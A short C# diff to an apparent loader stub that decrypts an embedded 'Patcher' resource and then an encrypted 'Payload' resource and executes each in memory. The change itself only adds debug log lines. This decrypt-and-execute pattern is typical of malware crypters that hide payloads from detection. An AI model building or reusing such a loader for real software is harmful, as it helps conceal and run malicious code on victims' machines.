@@ -26,8 +26,19 @@ namespace EntryPoint
 
             var asm = Decrypt(Encoding.UTF8.GetString(Starter.Properties.Resources.Patcher), Starter.Properties.Resources.PatchKey);
             Execute(asm);
+
+#if DEBUG
+            Console.WriteLine("Decrypting.");
+#endif
             asm = Decrypt(Encoding.UTF8.GetString(Starter.Properties.Resources.Payload), Starter.Properties.Resources.Key);
+#if DEBUG
+            Console.WriteLine("Executing.");
+#endif
             Execute(asm);
+
+#if DEBUG
+            Console.WriteLine("Executed.");
+#endif
         }
 
         private static byte[] Decrypt(string b64, string secretKey)
